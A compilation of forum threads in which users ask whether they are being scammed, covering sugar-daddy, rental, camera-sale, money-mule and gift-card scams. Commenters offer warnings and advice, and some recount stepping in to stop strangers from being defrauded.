Sugar dad/daddy/mom/momma scams are [very common](https://www.fraud.org/sugarbaby_alert) and usually come in two varieties: fake check style scams, and advance-fee scams. Fake check style scams involve the scammer making a fraudulent payment to you that will later be reversed, and then you making some sort of payment to the scammer that will not be reversed. Common examples include the scammer sending you a fake check and asking you to buy gift cards, or to send money via Western Union, or to purchase Bitcoins. Another common example involves the sugar scammer offering to pay your bills, or offering you banking information that you will use to pay off your bills. These bank accounts are stolen and the innocent victim will reverse the charge when they notice the fraud.

The second variety of sugar scammers use advance-fee scams, where they offer you money but require you to pay first. They may ask for you to pay them to prove that you are loyal, or they may require you to pay a processing fee. It's common for sugar scammers to send spoofed emails that look like they came from services like PayPal or CashApp that will inform you that you have received money, but that also ask for a processing fee before the funds are released.

In the real world, sugar babies are sex workers that engage in in-person sexual encounters with their clients. **We do not recommend that people try to be a sugar baby, but if this is what you are looking into, check out the following subreddits for information on how to be safe: r/SugarLifestyleForum/ and /r/SexWorkers**.

- They will target you even more now.
- Stop playing with scammers. Morning good can come. Just block and delete.
- Oh no that was a different thing.

Title: Is this legit? I'm not sure if I'm going to be scammed
Body: I can't quite put my finger on it but something feels off about this. Why would someone sell new gear so discounted. Am I crazy? 

This is a message the seller sent me;

Hi ______, thank you very much for your interest in my BNIB Z8. I have a friend who owns a camera store and owes me a big favour from the time when his store was closed during the pandemic (I was selling his merchandise online, so he could pay his bills and survive financially). Therefore, at the end of each year I get special offers from him, so I can sell brand new Nikon gear tax-free and for much lower price than greedy retailers.  Also, you should know that the 1-year Nikon Canada warranty is not free: it amounts to several hundred dollars and is a part of the final retail price. However, if there is any electronic problem with the camera within one year, you would get a brand new replacement. Please see the 5-star reviews from my previous Kijiji customers. Sincerely,
Boris Sakic 

P. S. In few days, I will return to Hamilton. As soon as I get home, I can send you photos of serial numbers, so you can verify with Nikon Canada in Mississauga that the cameras are legit and for Canadian market.

- if you cannot have a look and pick up in person, assume it is a scam. Serial numbers don't mean he actually has that camera, he could have gotten that (and pictures) from someone else who was selling one, by posing as a prospective buyer.

The "I'm out for 2 more days" also is a bit suspicious IMO. Why didn't he just wait posting.
- Seems like an awful lot of unnecessary information which is usually a telltale sign of a scammer. Think if you were selling this, would you tell a potential buyer all of this?  If you‚Äôre considering buying this, I would recommend using an escrow company for a purchase this large. Any legit buyer would have no problem with this as the escrow process protects them as well.
- Why would you spend that much money on a listing with a SINGLE picture?
- I bet he also has a Yamaha GC1 piano and a 1959 Fender Stratocaster for sale at less than half the street price because he hates "greedy retailers". ;-)

This is a typical advance fee scam in which you are asked to pay a "reservation fee" because he has 30 other interested persons or whatever other excuse he can come up with. He takes the money, he disappears, the end.
- [removed]
- Options: 1) Meet in person at a safe location and fully inspect and test. 2) Use an escrow service. 3) Walk away.
- I would never buy anything that expensive unless either I could see the item in person or it was sold through a site that offers full 100% buyer protection - e.g., Ebay. Don't do it.
- Yes you are being scammed. They have a whole platform that they scam people on
- I agree. He did givee the information after I asked him how he is selling a brand new camera for $500 bucks off

- this is 100% a scam
- It's so weird because he's agreed to meet in person and for me to pay after I see the camera.
I found his Facebook and Instagram, and his story actually seems to check out.
- Dude come on.
He told you all that nonsense about why he gets such good prices.¬†


And you want to oay 4 thousand dollars in cash. Come on.


Suggest meeting at a police station.¬†
But I would walk away from this scammer now.¬†


Greed is the scammers best friend.
- Good idea to meet at a police station. If he's legit, he'll be appreciative as he would also be nervous.

Title: Am I being scammed by this landlord? Rent.com
Body: I found a townhome listed on Rent.com. I asked for the landlord to reach out to me, which he did via email and then text. I was able to set up a self guided tour and the landlord provided me the passcode to enter the house. It was very nice so we decided to go ahead and apply, sign the lease, and pay the deposit. Overall, it feels legit to me but there are a couple things that have me worried. 
1) The landlord lives in Texas (we are located in Missouri) so we haven‚Äôt met him. 
2) The landlord requested the deposit be paid through apple pay which I thought was a little weird. 
3) The townhome was also listed on zillow but for $500 more a month. I asked the landlord about this and he said they were doing a rent to own option but decided just to rent. (This was also outlined in the lease so i just shrugged it off)

Comments:
- NOPE! They make their own appointment with the REAL owner that gives them the passcode to get in. Then they tell you and steal your money!


Don't pay!!!
- !rental

If you haven't met anyone IN PERSON you don't have a rental.
- Use a different phone number/email and inquire about the rental through Zillow.
- Standard rental scam.

Stop talking to the scammer. Do not send more money.

Never rent a place without meeting the owner or agency in person.

If anyone gives you a code for a self guided tour then wants money without meeting you, its a scam
- This is 100% a scam.
- Reach out on the zillow ad.
- I would never do business in this way.  If I'm giving someone thousands of dollars to rent a place, it gets done in person, whether it be the actual property owner, or an agent.  There are just too many rental scams going on out there.  I don't think it too far-fetched for a scammer to view it first to get that access code, then turn around and start scamming others.
- In my country in Texas I can look up any property and find the owner.  Try googling ‚Äú<county> appraisal district‚Äù and find out who owns the property. Then reach out to them.
- If you paid through Apple Pay, dispute with apple & it's possible to get your money back. Slim but possible.
If you paid via Zelle consider the money gone! PayPal you could get it back, but don't get your hopes up
- If you see it on Zillow for more a tell tell sign is look at who the property mgr or owner listed on the Zillow ad is. It won‚Äôt be the same because you are being scammed by someone who simply stole their photos. ü§¶üèª‚Äç‚ôÄÔ∏è
- Where I live the Rental Management Companies do actually do contactless viewings which I found to be crazy. You make an appt, then 10 mins before your appt they send you a code. I would never allow people in my house like that but they sure do here. 
Still have to be careful and turn over all the rocks.
- This is absolutely a scam.  I am glad that you are not going to send any more money.   

PLEASE call the agent in the Zillow ad, tell them what happened.  They can confirm that this is a scam. Tell them to change the lockbox code so that nobody else gets scammed. 

Also please notify Rent.com that it is a scam and ask them to remove the advertisement.

If I were you, I would also file a police report.  Although many scammers are overseas, it‚Äôs possible that this scammer may be a local person who applied on Zillow to get the lock passcode. You could be the hero to get this criminal arrested.
- Please be careful.  There are too many rental scams going on.
- So if you saw it on Zillow.m, are the contact #s the same?  Contact names the same?
- Yes, and you should be working with a realtor instead of going it solo because you don't know how to authenticate the landlord on your own.  There are realtors who do this for a living,  so go look for apartment finding services in your community.
- I was dumb and just really wanted it to work. Yes, it was indeed a scam. Come to find out, the guys name is Ricardo. I know we won‚Äôt get the 1000 back but that‚Äôs alright, lesson learned. Thank you everyone

My parting message

- UGH i wish there was a way for me to definitively know. We already sent $1000 for security deposit and he‚Äôs still been in contact with us
- Hi /u/Splax77, AutoModerator has been summoned to explain the Rental scam.

Rental scammers usually list apartments at lower than market rate, and will ask for some money up front, or will offer you the keys for money up front. The scammer has no property to rent, and any money you send to the scammer will be lost.

Always tour the place in person with the landlord, property manager or realtor. Never alone, never with an access code, never virtually. Only send deposits and application fees after touring the place, and get a proper receipt for it. Anyone trying to collect money from you without meeting you is a scammer or a shit landlord.

Verify the identity of whoever is touring the place for you. It's always good to check with neighbors to see if the person you're dealing with is legit, or if there's a story behind it. You may learn that this is actually an Airbnb and that a scammer got an access code for it. You may find out the real owner/renter is away on vacation. And if it's a sublet, be informed about it and check with the original landlord to see if it's allowed.

Never sign contracts, or pay deposits, or even application fees/reservation fees without meeting in person first. Never ever send a photo ID or anything not considered public information. Nobody should ask you to pay to reserve your spot without meeting face to face.


**
- You can file a dispute through Zelle but you‚Äôre right, it is unlikely you‚Äôll get funds back. It will alert the financial institution the person accepting payment is a fraudster, who is likely a mule, but slows them down.
- He doesn't care he's likely not in the U.S. and his name probably isn't Ricardo
- My god. Why bother asking if you already sent the money?!! Try to get it cancelled or get it back if you can, probably too late though
- Any changes on Zillow? Is it still listed? Have you tried contacting the owner through Zillow?  

So easy to check before sending money...
- Well you definitively know NOW, because everyone has told you.

100% rental scam  
He's still in contact with you because he's still got more money to get.
- The dude is a scammer not a landlord.
- I am asking because I would like to actually have a place to move into in a couple months and I don‚Äôt want to lose anymore $ if it is fraud. I‚Äôve never dealt with rental fraud.
- He desperately wanted it to be real.
- A lease has been signed so I am just sort of at a loss.
- Well, a lease is hardly legally binding if it's a scam.
- The only thing to do now is look up the property records via the county clerk where the apartment is located and get the owner information off of there. Then contact that owner and see if they‚Äôve ever heard of you or your $1000. 

Or knock on the door of another apartment and ask for the landlord‚Äôs contact information. 

But this sounds like a scam.
- Or contact the real leasing agent & ask them. Detail the time and appointment as they should have records if they sent that passcode to someone else at the time!


File a police report if needed.

- Sounds like a cartel scam (sorta) at first but you don't mention any kind of demand he's making. Did you recently get that number or something?
- Just block.
He is phishing. It is a scare tactics.
If he keeps contacting you, contact the police with information you have of him.
- Just block them. You‚Äôre fine.
- I'm actually on this thread right now because I'm receiving very similar messages from a supposed angry wife who is claiming I've been messaging her husband. What freaked me out is that they clearly have my address. "She" said my name in his phone is "Myname #myapartmentnumber" which is three digits so it can't be a coincidence. Good to know someone else is experiencing the same thing though!
- There have been so many data breaches that much of our personal information is out 6 scammers are using it to scare us to death. You used to be able to tell the scam because they never used your name. Those days are gone.
- Ignore, report, block and delete.
- He‚Äôs texting you from Nigeria, block and ignore
- He didn‚Äôt make any demands. He just accused me of inboxing his girl on fb. He won‚Äôt say what girl it is or when it was. Yes, he just started texting me on Saturday.
- Okay thank you so much
- Wow I definitely feel less alone. It‚Äôs truly a scary feeling and it‚Äôs hard to even relax cause the paranoia is is overbearing. Are you getting threats too?
- It‚Äôs really scary that our information is shared for everyone to see. I really hope this person is scam cause he messaged me the exact car that I drive
- I mean get YOUR number.

Anyway, block and ignore. Also, you made the thread twice.
- Seems you are in tracking scammer list
- sounds like your data breach involved a database that included your vehicle info. Dealer, mechanic, auto parts store. just ignore
- I‚Äôve been blocking him but he keeps using different numbers to text me
- Keep doing it.

- Never trust pop ups. Jeez man this is shit we used to see on the Internet circa 2003 and wondered who believed this.
- Considering there is more than 8b search daily, i would not think google celebrates the person that does the 5 billionth one. Why would they?
Certainly not for 1k gift cards that is not related to google
- Back in the early days of internet we all won prizes daily.

It's why nobody can buy a house anymore; websites stopped giving prizes for visiting them.
====

No, it's a scam. No site will give you anything for just visiting. Or for anything else. If anybody online promises you money for doing nothing or very little, it is a lie.

Also, there's no hot single ladies in your area waiting for you.
- There‚Äôs about 8 billion google searches every day btw
- According to some quick Google searches, the average website gets around 300k visits per month (which is a number that skews higher than realistic due to massive outliers like popular search engine sites and social media, so it's safe to assume that this is an extremely high estimate for the majority of websites, but let's be generous and use this estimate.) Assuming this sketchy book site achieves these numbers, it would take 1,388 years to reach 5 billion searches.
- It's crazy they still do this stuff. Growing up around it I didn't think people still went for this stuff, but if you want something enough you may be tempted to give it a shot. But we all know that if it's too good to be true it probobly is.
- Now that is truly one in a billion
- Get the Libby app. It‚Äôs free with your library card
- Not that this has anything to do with the scam but if you want to read books for free, go to the library. And if you have a library card you can download the Libby app which offers millions of books/audiobooks through your local library.
- [removed]
- I remember this from 1997.
- They still use popups to fool people into thinking their computers have been hacked and taken over and payment is required to get it back - a surprising number of people still fall for that one, when all you have to do is close the popup.
- Yeah 5 billion isn't a lot when it comes to worldwide Google searches lol

Title: My aunt will not listen to me
Body: So my aunt came to me to help her send some guy on the phone money through cash app. When I asked why they both gave me 2 different stories without me truely understanding what shes actually trying to do. I found out that she‚Äôs sending this guy money to see if her cash app is working but I‚Äôm telling her do not buy into it because it‚Äôs a scam and she refuses to listen to me and shuts me down. This guy had me to add 280 into cash app and then buy 280 worth of bitcoin and then sell it and withdraw it back into the account. I‚Äôm guessing he‚Äôs trying to get her to think he‚Äôs actually trying to see if her cash app is working. Then he had me try to create a Apple Pay and add 680 onto cash app card to send to a guy name Leroy. I asked him the company he works for and it just doesn‚Äôt add up. Not only that but he‚Äôs actively trying to get her cash app id to probably be able to send himself the money. Me and my family has told her don‚Äôt do it but she won‚Äôt listen to none of us.

- You can at least stop helping her do this. Which you should. You did try to stop her but you aren't her parent
- Some people are stubborn and can only learn the hard way.
- Definitely a scam, but not sure what they're trying to set up other than a way for her to deposit money that he can take. Where did the $680 come from, him or aunt?

Wait, it sounds like he's trying to set her up as a money mule to launder money from stolen CC's and turn them into Bitcoin  deposited into his wallet.
- This is a common mule scam. Money will be sent to her via Zelle or CashApp or Apple, from people she doesn‚Äôt know but he claims to. People she doesn‚Äôt know send money to her account, she transfers to CashApp then bitcoin. Eventually the Zelle or Apple transaction is disputed cause the sender was scammed into sending it. Your aunt is left holding the bag because the terms and conditions state she can‚Äôt do transactions on others behalf. It‚Äôs also called money laundering. It‚Äôs illegal and she needs to stop.
- Some people just need to learn the hard way.
- She had me and my cousin helping her. When I told her just call your bank and inform them what you‚Äôre doing in hopes that they can convince her it‚Äôs a scam. Idk what the hell she is thinking
- She says she owes him 680. She said that his company or he was helping her see if her cash app was working. So he sent her 398 on cash app but she‚Äôs insisting that he did send her 680 or something. I was looking through her cash app transactions and it didn‚Äôt add up right. I tried explaining it to her but she just refuses to allow me to explain my suspicions. This guy is clearly scamming her and the fact i originally thought it was cash app support which is why I was helping her at first until I realized she‚Äôs trying to send him money to an random cash app Id.
- She's not. Thinking. That's what the scammer is shooting for.
- So scammer has gotten $680 from her ... probably sent a faked email showing her 'sent' $680 to her which is why she was checking to see if cash app was 'working'. This is just the beginning...

He's saying nice things to her while you and her son are saying mean things about the nice man giving her attention. She would rather believe the nice man.
- Because her card isn‚Äôt working I‚Äôm hoping that it will force her to contact her bank and they could assist her with this situation and try to convince her that it‚Äôs a scam.
- Unfortunately, banks don't do that. It's her money and the bank won't make a moral decision. If someone wants to give their money away, the bank will only give them their money.

He‚Äôs threatening to hurt me and send people out to get me. He also said that someone told him information about me. He said someone told him where I be at and what car I drive and he told me to watch my back. Is this real or a scam. HELP.

Title: If you saw a stranger out somewhere falling for a scam, would you say something  to them?
Body: This has come up twice for me, and I didn't say anything either time. 

Last month on a flight, while waiting for the lavatory at the back, I overheard a flight attendant talking about selling his car. He excitedly read a message out to another attendant of the buyer offering to pay extra for it to be picked up, and included "kindly" in the message.   
I sat in my seat for a few hours wondering if I should say something, but couldn't figure what to say or how to say it without feeling like a creep for eavesdropping. 

Then today at the supermarket a young East Asian couple in line in front of me were buying Apple gift cards. The store manager had to come over to approve the amount. They each bought one, and that was the only thing they bought at the store. They wanted to buy more, but the manager wouldn't let them.  
After they left, the manager was talking to the cashier about how she's supposed to limit Apple GC purchases, and to kick them out if they protest.   
After the manager left, I told the cashier that it was likely a scam, and the couple were likely the ones being scammed. She told me that the guy had to split the GC balance between 2 credit cards. 

When I got outside I looked for them in the parking lot, but they were likely long gone. 

I wish I had said something, but in the moment didn't know how to broach the topic... "excuse me, do you mind if I ask why you're buying several hundred in apple GCs, I think you're being scammed?" Seemed a good way to get told to mind my own fucking business. 

If I do see this again, I \*want\* to say something, to warn them.   
How would you approach this?

- If I could get to them, yes.

But... that being said, I can totally understand how you got caught off guard and froze... and didn't know how to handle it. I could see the same thing happening to me because I have a tendency to freeze up sometimes when I'm taken off guard too.
- [deleted]
- A simple comment like "there are so many scams involving people online demanding apple gift cards. It's so awful!" Might plant the seed of doubt and open the doors to a wider conversation. You could then outline a basic scam to them, like pig butchering, or the grandchild in trouble, and see if it rings any bells.

But I have a thick skin, so when people tell me off I just shrug and go on my way. In the end, it's only words. 

If I thought I could save someone from a scam, I would at least try. I was saved, when I was very young, from getting a ridiculously high interest rate loan at a car dealership by a passing stranger and I've never forgotten them or that lesson. I'll pay it forward when I can.
- I was just listening to an episode of the podcast Scam Goddess where Paula Poundstone told the story of trying to stop a scam happening in front of her at Dunkin' Donuts. The woman in front of her did the old "getting change" scam and when she asked the person behind the counter "why did you give me two singles for that $20?" Paula said "she didn't, she gave you two tens." This woman immediately started hitting Paula and then ran out the door. And then the woman behind the counter made Paula pay full price for all of her donuts.

I personally tried to stop my old boss from clicking on an email that said that her bank account had an issue. It was obviously a scam. But my old boss was such a shithead that she clicked on it anyway and sure enough got her whole account drained and was mad at me for months afterwards.
- I always want to ask people why they are using the Bitcoin ATM but I‚Äôve never had the nerve to do it. 

Some look like drug dealers so that‚Äôs obvious but there have been some normal looking older people using it and I‚Äôm 99% they are being scammed.
- I have tried to stop someone from being scammed but they refused to believe that they were being scammed.  Even the clerk at the store joined in with me and explained how it was a scam but the victim kept saying, ‚Äúwell, I don‚Äôt know.  It might be real.‚Äù  So we just wished him good luck and let him get scammed.  You can‚Äôt help someone who believes they‚Äôre getting free money.
- It‚Äôs never terrible to say ‚ÄúI‚Äôm sorry, I couldn‚Äôt help overhearing‚Ä¶ a friend of mine was in a similar situation and it turned out to be a scam - do you have a second to talk about it?‚Äù

You are at least planting the seed of doubt in their head, even if they don‚Äôt discuss it any further. 

That‚Äôs the best you can do.
- I was going to buy cigarettes at the corner store and heard a guy on the phone with what I assume was a friend telling him something along the lines of "bro it's zero risk" etc etc. I asked him if it was a scam and he said something in defense of whatever he was trying to get his friend to invest in. I went on my way, I wasn't going to find out the details and break it down for a stranger at a gas station, I did my part.
- I've done this on the one occassion I had the chance to. It sits on my conscience if I don't and seems like this is weighing on yours. I start off with my best Canadian sorry and politeness:

I'm so sorry for interrupting your day. I couldn't help but overhear the conversation from where I'm standing. This sounds like the situation may be x scam and I wouldn't be able to forgive myself if I said nothing. 

Then continue based on their response. In my case I was thanked and got back equally polite Canadian style banter. Also include some statements to save their pride like happens to the best of us, most people aren't aware, they really should have signs out warning people etc.
- 100% I would. I‚Äôve yanked a handful of Apple gift cards out of a seniors grasp as he was hurrying along shouting into his phone that he was ‚Äúdoing it just hang on!!‚Äù
He flipped around, stunned and I said ‚ÄúHang up. It‚Äôs a scam‚Äù. 
He eventually did hang up. I was ready to grab the phone too üòÇ
It was the standard card scam. Thankfully not a demanding spouse or whoever. They can be quite convincing and they have some personal details already. 

I wouldn‚Äôt hesitate to do it again.
- One time, while in a CVS, I  overheard a guy on his cell talking to someone from the power company.  He was on the speaker phone so I could hear what the caller was saying and recognized it as a scam.  I told the guy that he was being scammed.  He didn't believe me at first, so I pulled it up on my phone.  The scammer told him not to listen to me.  I told him to hang up and call the power company directly.   He thanked me later.

If you suspect someone is being scammed, let them know.
- I intervened and stopped an older gentleman from buying gift cards in Wal Mart (while he was on speakerphone being directed by a scammer.)
- When I was a young man I watched a guy on the Chicago elevated get grifted by a 3-card Monty team.  The guy lost $150 in about 2 minutes.  

I didn‚Äôt intervene because there were 3 guys obviously in the crew.  They didn‚Äôt look like they would‚Äôve taken my interference lightly.
- We have a Bircoin machine in our store and have had a few old geezers come in who clearly had no clue what they were doing. Like, sitting there for 45 minutes trying to figure it out, and whatsapping with someone. To a man, when I tried to intervene or question them, they got very snippy with me. Unfortunately, someone in the throes of this kind of thing are hard to dissuade from it.
- When I was younger, no, I wouldn't have the courage or confidence to say something. Now that I'm much older and wiser (I hope!) yes, I would definitely try my best to stop the scam.

I would approach politely but very quickly use the word 'scam'. The first thing I'd say is "I'm very sorry for interrupting but I think you're being scammed. Do you mind if I try to guess why you're buying those gift cards?" Then proceed to lay out the very likely scenario. 

I would also use some variation about the car for sale, but I'm less informed how that scam works.

I don't consider it eavesdropping if the convo/transaction is happening in public and not in a way that someone was trying to keep it quiet.
- Has been repeatedly told to mind my own business, so probably not. I'd want to, but ...
- Absolutely, yes. I would try my best to step in. I actually tried to stop a family member from falling from a check scam on Craigslist 10 years ago, but they didn't listen to me. Now, it's much more common and the information is easily found online. So now, it's easier to pull it up on your phone to show people the evidence.
- Absolutely. And while passing the gift card section (or shopping for a gift card myself) I always try to glance around to look for nervous-looking people embroiled in phone conversations as they would probably be scam victims.
- If it helps at all, pretty sure none of the 3 of them would have listened to you.
- I‚Äôve done it many times.  A few were in so deep it took a lot of convincing.
- I tried to convince a woman who was buying gift cards that it was a scam, but she didn't believe me. Evidently the scammers can be more convincing than me.
- Saw an elderly lady at a bitcoin ATM. I said something to the effect of "I know it's none of my business but these machines are used in a lot of scams, are you sending money to someone, and if so are you absolutely sure you know who you're sending money to?"

She assured me that she did, and I asked a couple of follow-up questions (like: is it a trusted acquaintance you've met before?) that she answered confidently yet vaguely which I guess makes sense because I'm a stranger asking her for financial information. I couldn't force her to tell me anything so I had to let it go, but next time I was at that corner store I had a chat with the owner and told him to please be vigilant about keeping an eye out for signs of a scam.
- Always. I stop and ask if people are ok if they are off the road in the middle of nowhere and everything in between. But I‚Äôve been in fire/rescue for 20 years. I just ask people if they need help where ever I am, if they are safe, if someone is birthing them, etc. I always keep a big medical kit in my car and have used it many times for strangers, I also have tow straps and a lock-out kit. Anyone can do it, but it helps to be able to be able to read people a little.
- They never listen, in my experience.
- I've been tempted to speak up when I've seen some poor sap taking the "e-meter" test at a Dianetics (aka Scientology) information booth at local malls. I haven't, but it sure was tempting.
- In some stores, you go through training that helps you identify scams. The manager most likely knew and was aware. They can only do so much. I went through training on how to identify scams and what to do in those cases while training for a retail pharmacy in the US. Again, they can only do so much and normally have policies and training to address the potential issues. But not everyone is prepared or pays attention to that training. ü•≤
- I saw an elderly woman at a bitcoin atm in Los Angeles and I approached her and tried to make sure she was alright and new what she was doing but she didn't want to have any part of it.  I felt good about trying.
- "That‚Äôs such a tough situation. üòü 

It‚Äôs hard to know what to say in the moment without feeling like you‚Äôre crossing a line. Maybe something like, ‚ÄòHey, I‚Äôve heard of people being scammed this way‚Äîjust wanted to check if everything‚Äôs okay?‚Äô could work.

At least it plants a seed of doubt if they‚Äôre unsure. Thanks for sharing‚Äîit‚Äôs a good reminder to look out for each other!"
- Normally yeah I would at least say something. But if I was sure they were maga, no.
- I tried to stop an elderly lady at CVS from buying hundreds of dollars in Apple cards to pay her grandson's bail, telling both her and the clerk and eventually the manager that it was a common scam, but by the end of it they let her buy them and I looked like a crazy person rambling on about the internet and TikTok. I frequently send info about common scams to all my older relatives in hopes to help them stay free and clear.
- I would say yes.  Years ago I saw a woman being pickpocketed in Italy.  Two young teenagers were on each side of her, and one was showing her a piece of paper trying to distract her while the other one grabbed something quickly out of her purse.  They walked away, and I ran up to her and told her.  She realized her wallet was gone.

Long story short, we tracked down these kids.  There were about seven or eight kids and under their shirts were these big elastic bands with several wallets, purses, etc.  She did get her wallet back.
- There is a notorious scammer in the area named Tina the Hunchback. She is a known scammer and has been around for at least 25 years scamming people. She walks around bent over like a hunchback, even though she is not disabled at all. She will very aggressively demand money from people. She is also known to demand rides and stuff too. I first met her 20 years ago when she was asking for money for the bus. I offered her a ride instead but she threatened me with a cane if I didn't give her $2. I explained if she hit me with that cane, she better make it count because it would be the only chance she would get. That deescalated the situation to where she just told me to fuck off and walked away. That is when I learned, after telling the story to other people, that she is known to be a huge piece of shit. 

I have seen her about 20 times since then and I have always yelled out to her, from a distance, when she is in the middle of attempting to scam people "Hey Tina! You fucking scamming piece of shit! Don't give her money! She is a scammer! I've called the cops Tina! They are on their way!!" She then always runs off to hide behind cars, or buildings or gets into her nice luxury car, once was a Cadillac and once was a BMW, and drives off. She used to frequent the mall where my store used to be at and I have called security on her so many times from that. 

Also I have called out white van scammers in parking lots a few times. They've threatened me saying they would follow me home and shit like that. Whatever. Every time they have left the parking lot because I was making enough of a stink, nobody would fall for their shit.
- I've seen a scam take place live but there was a clear issue of race if I intervened and I though an ATM transfer isn't going to be much more than a life lesson for the young student. (Romani's raise the race card easily when confronted)
- I was at the supermarket checkout, not paying much attention, and the person in front of me handed over their credit card to buy "$2000 in gift cards", I was too bewildered to say anything.
- Sorry, but I couldn't help but overhear...
- Go ahead and warn them. We're in a community and should help each other. I saw an Italian at the gas station with a rental car. He showed me his tickets for a flight a few hours later and his passport. He had some leather jackets brought to USA as samples. He wanted to sell them for a fraction of their value. I passed. I knew.

A few days later he's selling jackets at the same gas station to a guy. I told the vendor in front of the mark "Didn't you have a flight out three days ago?" He said F off, mind your own business.
- Sometimes doing the right thing is risky.  You're admitting to eavesdropping, you're getting into their business and you're questioning their competence.

That having been said, I could never have sat by and let those things happen, even to complete strangers.  After delicately testing the waters, I would ask lots of questions to lead them to avoiding heartbreak.  Good deed.
- I definitely would. I‚Äôd tell them off the bat that it sounds like they‚Äôre being scammed, give them the red flags (sending money in advance, giving money to the seller in order to pay for the ‚Äúpickup person‚Äù etc.), and finish the conversation.

I would not see them again after that, so what they do with the info I just gave them, I‚Äôll never know. But at least I can sleep soundly knowing I did my part.
- Yup. I did this recently while on holiday. One of those women who hand out flowers then harass you for money was doing her thing outside a tourist attraction. She approached a couple and handed them each a rose. I told them to give them back because it was a scam and they would be hassled for money. Flower lady wasn't happy, but I give very few shits about the feelings of a scammer.
- screamed at one of the unlicensed taxi fraudsters at LGA trying to predate on a woman with a child, while the airport employees pretending they couldn't see him waving his cell phone which said Uber. in fairness, they are genuine assholes, genuinely dangerous and it was a long flight
- 100% yes
- No,I stood and watched.was in Spain last year and an overweight,deeply tanned couple were sat at the bar next to the beach,a ‚Äòseller‚Äô comes up and compliments the guy on his chain,guy just grunts in return and stares into space whilst the ‚Äòseller‚Äô carries on chatting,getting his own chains out and putting them on the guy,guy rudely says he‚Äôs not interested in buying one so ‚Äòseller‚Äô takes the real gold one off and leaves a fake one on the guys neck.guy and his wife didn‚Äôt even look at the seller once,treated him like he was nothing so I left him to it.perhaps if they‚Äôd have bought one of his fake chains or even said no politely I‚Äôd have said something,was interesting to watch his skills
- Maybe it's better to be quiet.  Especially on a plane. Your heart is in the right place but imagine being trapped up there with someone angry with you. I notice the happiest people are the ones who act like the 3 monkeys. I can't find the emojis but you know them
- How would you approach it?
- Ugh‚Ä¶.i hate the fake car service drivers that prey on tourists. I get it, they‚Äôre easy marks‚Ä¶but it makes me a little bit sick. As a New Yorker, I have helped many a tourist get an Uber or Lyft, or a legit NYC cab.
- Thank you for doing that! I would hope someone would do that for me.
- I have done the same with the bicycle pedicabs near penn station. They hide their rates and charge like $20 a minute‚Ä¶. Those guys did not appreciate me yelling out it was a scam while walking by.

The tourists luckily seemed put off by it and I don‚Äôt think they took the ride üëçüèª
- >  I was in New York City a limo driver was scamming some Tourists 

First time I went to NYC 30 years ago, there was a guy there who said his cab "was available for hire now, no waiting". I went along and his "cab" was a private car. No way was I getting in that.
- This is the part that makes me crazy to hear - you tried to warn someone and they got mad at YOU when they fell for it anyway.   Cognitive dissonance and ego protection are powerful things.
- Sorry that happened to you. As I tell my kids, "No good deed goes unpunished."
- A lot of immigrants use them for remittances -- to send money to their families in other countries.
- You should still be proud for doing the right thing.
- This is a good approach. "It happened to a friend" is more relatable than "believe me, I read about this on the internet."
- Excellent. Society at its best, looking to protect the elderly and vulnerable.
- Good for you!!
- I'm pretty jaded about the gullibility of people in general, but it still astounds me that people fall for the 3-card monty / shell game scam. As if there aren't literally thousands of examples of it being a scam across thousands of years of pop culture. It's practically the prototype of a fixed game. The first time I saw it in real life I couldn't believe they were still running that game, like it was something out of a movie.
- How does anyone not know this is a street scam, in this day and age?  
When you see it, everyone should be thinking 'oh, it's that scam, not oh, its that card game'
- I'm a Chicagoan too and will never forget the time I was on the red line and watched a young lady engage with them. They did that play where someone wins, then she put up her money and of course lost. Then she cried and begged them to give it back to her since she needed it for her rent.

Her tears did not move them and others chimed in too to chide her for being so dumb. They got on off the train and left her to cry about her mistake.
- I was at the drug store recently and noticed that the rack of gift cards had at least 5 big signs warning about  buying cards for people you don't know, it could be a scam.   If I saw someone buying a alot I would def say something, even if it was sort ot jokingly like " wow, that's a lot of cards.  I hope you aren't sending them to  your secret friend in Nigeria." or something like that.
- That was my assumption as well.
- I've been looking at getting a lockout kit, do you have any suggestions? Are there any items that are definitely good or definitely bad? For example I feel like the classic slim jim has become obsolete because most people just wedge the door open slightly with an airbag and use a bendable grabber to grab the handle but maybe I'm wrong
- Why should it matter?
- Wait you‚Äôre upset people ignored a scammer and a thief? So you purposefully just watched as he stole from them? Dang

Fwiw i an from Chicago and we are taught to ignore scammers and the like since childhood. A lot of us, myself included, would react the same way to random strangers harassing us and clearly trying to sell us sh*t and scam us. We are taught to ignore, and not engage with them.
- Hmmm... I think I might just go over to them and say something like: "I couldn't help but overhear your conversation and that you're doing/about to do X,Y,Z (buy Apple gift cards for instance), and I am so sorry to intrude & I'm not trying to get in your business, but if I don't at least TRY to tell you what I know I'll never forgive myself."

And then go on to explain my concerns. It's very possible they'd tell me to f*** off & mind my own business and if that happened then I could live with that, because at least my conscience would be clear, because I'd know I did my best to try to help them.
- "Sounds like a scam"


Short and sweet.
That might be all the break they need to slow down and think.
Then give more information.
- ‚ÄòI couldn‚Äôt help but notice you‚Äôre spending an awful lot on gift cards‚Ä¶ I just wanted to say that my elderly dad recently got caught up in a scam where he sent money via gift cards to some unknown person asking a seemingly reasonable request‚Ä¶ I just wanted to make sure you‚Äôre not caught u in something like that.‚Äô   If they‚Äôre accepting, I‚Äôll ask more, but if not - oh well‚Ä¶    Cashiers are supposed to look out for elderly people spending a lot on gift cards nowadays, but idk how rigorous the training is‚Ä¶
- [deleted]
- In Toronto too. There was a guy hiding behind a post at the airport offering a cab ride. 

My daughter slipped away while I was talking to him and came back with a couple of security guards. Then we went downstairs to the bus terminal.

Wherever you are, never hail a random taxi at the airport. Take a bit of time to learn how to recognize a legit airport taxi and where to find them. If possible, arrange for a ride. And Lyft or Uber will know your name and will have a description of the car with plate number.
- She was a real shithead. That year was probably the worst year of my life. That Thanksgiving I just went home that Wednesday before and I just stayed in bed until Monday morning crying. She was the fucking pits.
- My bus was a complete trash bag, she was always mad at me ü§∑‚Äç‚ôÄÔ∏è
- I think some people do it, kinda knowing they're gonna get scammed, just so they have a"big city" story to tell
- (haha, you try convincing them that they've been duped!)
- I like it
- This is good
- It‚Äôs a great city. Maybe I‚Äôm a weirdo, but I want people to leave with a good impression of this city. Please don‚Äôt MOVE here (housing is already hard enough), but I hope you enjoyed your time here. 

I‚Äôm also a theater buff, so I run into tourists quite a bit down in the Theater District.
- Are we talking right or left for the duped.

- Thank you for sharing your unfortunate experience. Call your bank (at the back of your card, there should be a number) explain that you have been scammed and you want to block your current card, and ask them to issue you a new card.
- This looks like a real support chat. How did you fall for it? Can't be the actual one from etsy right.
